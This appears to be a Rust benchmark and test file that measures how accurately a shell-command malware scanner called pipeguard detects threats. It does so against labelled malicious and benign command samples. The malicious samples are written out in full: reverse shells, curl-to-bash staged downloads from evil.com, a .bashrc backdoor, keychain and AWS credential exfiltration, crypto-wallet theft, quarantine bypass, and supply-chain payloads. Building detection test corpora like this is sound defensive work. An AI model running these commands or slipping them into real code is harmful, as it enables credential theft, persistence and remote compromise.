//! Detection Accuracy Benchmark
//!
//! Measures True Positive Rate (TPR) and False Positive Rate (FPR)
//! using labeled test corpora from malware_detection_tests and false_positive_tests.

use criterion::{black_box, criterion_group, criterion_main, Criterion, BenchmarkId};
use std::process::Command;
use std::path::PathBuf;
use std::time::Duration;

/// Test case with expected detection result
struct LabeledSample {
    name: &'static str,
    content: &'static str,
    is_malicious: bool,
    category: &'static str,
}

/// Malware samples from malware_detection_tests.rs
/// Sources: MITRE ATT&CK, GTFOBins, real-world AMOS/ClickFix campaigns
const MALWARE_SAMPLES: &[LabeledSample] = &[
    // Category: Reverse Shells (MITRE T1059.004)
    LabeledSample {
        name: "bash_dev_tcp",
        content: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        is_malicious: true,
        category: "reverse_shell",
    },
    LabeledSample {
        name: "nc_e_revshell",
        content: "nc -e /bin/sh 192.168.1.1 1234",
        is_malicious: true,
        category: "reverse_shell",
    },
    LabeledSample {
        name: "python_pty_spawn",
        content: "import pty; pty.spawn('/bin/bash')",
        is_malicious: true,
        category: "reverse_shell",
    },

    // Category: Staged Downloads (MITRE T1105)
    LabeledSample {
        name: "curl_pipe_bash",
        content: "curl https://evil.com/install.sh | bash",
        is_malicious: true,
        category: "staged_download",
    },
    LabeledSample {
        name: "wget_pipe_sh",
        content: "wget -qO- https://evil.com/script.sh | sh",
        is_malicious: true,
        category: "staged_download",
    },

    // Category: Persistence (MITRE T1546.004)
    LabeledSample {
        name: "launchagent_install",
        content: "cp /tmp/evil.plist ~/Library/LaunchAgents/com.evil.plist",
        is_malicious: true,
        category: "persistence",
    },
    LabeledSample {
        name: "bashrc_backdoor",
        content: "echo 'curl evil.com/backdoor.sh | bash' >> ~/.bashrc",
        is_malicious: true,
        category: "persistence",
    },

    // Category: Credential Theft (MITRE T1555.001)
    LabeledSample {
        name: "keychain_dump",
        content: "security dump-keychain -d login.keychain",
        is_malicious: true,
        category: "credential_theft",
    },
    LabeledSample {
        name: "aws_creds_exfil",
        content: "cat ~/.aws/credentials | curl -X POST -d @- https://evil.com",
        is_malicious: true,
        category: "credential_theft",
    },

    // Category: Crypto Wallet Theft (AMOS stealer IOCs)
    LabeledSample {
        name: "exodus_wallet_theft",
        content: "cp -r ~/Library/Application\\ Support/Exodus/exodus.wallet /tmp/",
        is_malicious: true,
        category: "crypto_theft",
    },
    LabeledSample {
        name: "metamask_extension_theft",
        content: "cp -r ~/Library/Application\\ Support/Google/Chrome/Default/Extensions/nkbihfbeogaeaoehlefnkodbefgpgknn /tmp/",
        is_malicious: true,
        category: "crypto_theft",
    },

    // Category: Quarantine Bypass (MITRE T1553.001)
    LabeledSample {
        name: "xattr_quarantine_remove",
        content: "xattr -d com.apple.quarantine /Applications/Malware.app",
        is_malicious: true,
        category: "defense_evasion",
    },
    LabeledSample {
        name: "spctl_disable",
        content: "sudo spctl --master-disable",
        is_malicious: true,
        category: "defense_evasion",
    },

    // Category: ClickFix Social Engineering
    LabeledSample {
        name: "clickfix_verify_human",
        content: "echo 'Please verify you are human by running this command'",
        is_malicious: true,
        category: "social_engineering",
    },

    // Category: Base64 Obfuscation
    LabeledSample {
        name: "base64_decode_exec",
        content: "echo 'Y3VybCBldmlsLmNvbS9tYWx3YXJl' | base64 -d | bash",
        is_malicious: true,
        category: "obfuscation",
    },

    // Category: Supply Chain Attacks (DataDog GuardDog patterns)
    // Source: https://github.com/DataDog/guarddog
    LabeledSample {
        name: "supply_chain_subprocess",
        content: "subprocess.Popen(['curl', 'https://evil.com/payload.sh', '|', 'bash'], shell=True)",
        is_malicious: true,
        category: "supply_chain",
    },
    LabeledSample {
        name: "supply_chain_os_system",
        content: "os.system('curl https://evil.com/install.sh | bash')",
        is_malicious: true,
        category: "supply_chain",
    },
    LabeledSample {
        name: "supply_chain_eval_remote",
        content: "eval(urllib.request.urlopen('https://evil.com/code.py').read())",
        is_malicious: true,
        category: "supply_chain",
    },
    LabeledSample {
        name: "supply_chain_exec_base64",
        content: "exec(__import__('base64').b64decode('Y3VybCBldmlsLmNvbQ=='))",
        is_malicious: true,
        category: "supply_chain",
    },
    LabeledSample {
        name: "supply_chain_env_exfil",
        content: "requests.post('https://evil.com', data={'env': str(os.environ)})",
        is_malicious: true,
        category: "supply_chain",
    },
    LabeledSample {
        name: "supply_chain_npm_postinstall",
        content: r#"{"scripts": {"postinstall": "curl https://evil.com/payload.sh | bash"}}"#,
        is_malicious: true,
        category: "supply_chain",
    },
    LabeledSample {
        name: "supply_chain_fileless",
        content: "exec(urllib.request.urlopen('https://evil.com/payload.py').read())",
        is_malicious: true,
        category: "supply_chain",
    },
];

/// Benign samples from false_positive_tests.rs
/// Sources: Common developer workflows, system administration tasks
const BENIGN_SAMPLES: &[LabeledSample] = &[
    // Developer workflows
    LabeledSample {
        name: "git_workflow",
        content: "git add . && git commit -m 'Update' && git push origin main",
        is_malicious: false,
        category: "development",
    },
    LabeledSample {
        name: "npm_install",
        content: "npm install && npm run build",
        is_malicious: false,
        category: "development",
    },
    LabeledSample {
        name: "cargo_build",
        content: "cargo build --release && cargo test",
        is_malicious: false,
        category: "development",
    },
    LabeledSample {
        name: "docker_workflow",
        content: "docker build -t myapp . && docker run -d -p 8080:80 myapp",
        is_malicious: false,
        category: "development",
    },

    // System administration
    LabeledSample {
        name: "brew_services",
        content: "brew services restart postgresql",
        is_malicious: false,
        category: "sysadmin",
    },
    LabeledSample {
        name: "system_info",
        content: "uname -a && sw_vers && system_profiler SPHardwareDataType",
        is_malicious: false,
        category: "sysadmin",
    },
    LabeledSample {
        name: "log_viewing",
        content: "tail -f /var/log/system.log",
        is_malicious: false,
        category: "sysadmin",
    },

    // Legitimate curl usage (NOT piped to shell)
    LabeledSample {
        name: "curl_download",
        content: "curl -O https://example.com/file.zip",
        is_malicious: false,
        category: "network",
    },
    LabeledSample {
        name: "curl_api_call",
        content: "curl -H 'Authorization: Bearer token' https://api.example.com/users",
        is_malicious: false,
        category: "network",
    },

    // Legitimate base64 (NOT for obfuscation)
    LabeledSample {
        name: "base64_encode",
        content: "echo 'hello' | base64",
        is_malicious: false,
        category: "data_processing",
    },
    LabeledSample {
        name: "base64_decode_print",
        content: "echo 'aGVsbG8K' | base64 -d",
        is_malicious: false,
        category: "data_processing",
    },

    // File operations
    LabeledSample {
        name: "backup_script",
        content: "cp -r ~/Documents /backup/$(date +%Y%m%d)/",
        is_malicious: false,
        category: "file_ops",
    },
    LabeledSample {
        name: "archive_creation",
        content: "tar czf project.tar.gz src/ docs/ README.md",
        is_malicious: false,
        category: "file_ops",
    },

    // Legitimate nc usage (port testing)
    LabeledSample {
        name: "nc_port_test",
        content: "nc -zv localhost 8080",
        is_malicious: false,
        category: "network",
    },
];

fn get_pipeguard_binary() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("target")
        .join("release")
        .join("pipeguard")
}

fn get_rules_path() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("rules/core.yar")
}

/// Run detection and return whether threat was detected
fn detect_threat(content: &str) -> bool {
    let output = Command::new(get_pipeguard_binary())
        .arg("scan")
        .arg("--rules")
        .arg(get_rules_path())
        .arg("--input")
        .arg("-")
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .expect("Failed to spawn pipeguard");

    use std::io::Write;
    output.stdin.as_ref().unwrap().write_all(content.as_bytes()).ok();

    let result = output.wait_with_output().expect("Failed to wait");
    !result.status.success() // Non-zero exit = threat detected
}

/// Calculate detection metrics
pub fn calculate_metrics() -> DetectionMetrics {
    let mut true_positives = 0;
    let mut false_negatives = 0;
    let mut true_negatives = 0;
    let mut false_positives = 0;

    // Test malware samples
    for sample in MALWARE_SAMPLES {
        if detect_threat(sample.content) {
            true_positives += 1;
        } else {
            false_negatives += 1;
            eprintln!("MISS: {} ({})", sample.name, sample.category);
        }
    }

    // Test benign samples
    for sample in BENIGN_SAMPLES {
        if detect_threat(sample.content) {
            false_positives += 1;
            eprintln!("FALSE POSITIVE: {} ({})", sample.name, sample.category);
        } else {
            true_negatives += 1;
        }
    }

    let tpr = true_positives as f64 / (true_positives + false_negatives) as f64;
    let fpr = false_positives as f64 / (false_positives + true_negatives) as f64;

    DetectionMetrics {
        true_positives,
        false_negatives,
        true_negatives,
        false_positives,
        tpr,
        fpr,
        total_malware: MALWARE_SAMPLES.len(),
        total_benign: BENIGN_SAMPLES.len(),
    }
}

#[derive(Debug)]
pub struct DetectionMetrics {
    pub true_positives: usize,
    pub false_negatives: usize,
    pub true_negatives: usize,
    pub false_positives: usize,
    pub tpr: f64,
    pub fpr: f64,
    pub total_malware: usize,
    pub total_benign: usize,
}

impl std::fmt::Display for DetectionMetrics {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        writeln!(f, "=== Detection Metrics ===")?;
        writeln!(f, "Malware Samples: {}", self.total_malware)?;
        writeln!(f, "  True Positives:  {}", self.true_positives)?;
        writeln!(f, "  False Negatives: {}", self.false_negatives)?;
        writeln!(f, "  TPR: {:.2}%", self.tpr * 100.0)?;
        writeln!(f)?;
        writeln!(f, "Benign Samples: {}", self.total_benign)?;
        writeln!(f, "  True Negatives:  {}", self.true_negatives)?;
        writeln!(f, "  False Positives: {}", self.false_positives)?;
        writeln!(f, "  FPR: {:.2}%", self.fpr * 100.0)
    }
}

fn detection_benchmark(c: &mut Criterion) {
    let mut group = c.benchmark_group("detection");
    group.measurement_time(Duration::from_secs(10));

    // Benchmark individual malware samples
    for sample in MALWARE_SAMPLES {
        group.bench_with_input(
            BenchmarkId::new("malware", sample.name),
            &sample.content,
            |b, content| {
                b.iter(|| detect_threat(black_box(content)))
            },
        );
    }

    // Benchmark individual benign samples
    for sample in BENIGN_SAMPLES {
        group.bench_with_input(
            BenchmarkId::new("benign", sample.name),
            &sample.content,
            |b, content| {
                b.iter(|| detect_threat(black_box(content)))
            },
        );
    }

    group.finish();
}

criterion_group!(benches, detection_benchmark);
criterion_main!(benches);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_metrics_calculation() {
        let metrics = calculate_metrics();
        println!("{}", metrics);

        // Verify acceptable thresholds
        assert!(metrics.tpr >= 0.95, "TPR below 95%: {:.2}%", metrics.tpr * 100.0);
        assert!(metrics.fpr <= 0.05, "FPR above 5%: {:.2}%", metrics.fpr * 100.0);
    }
}
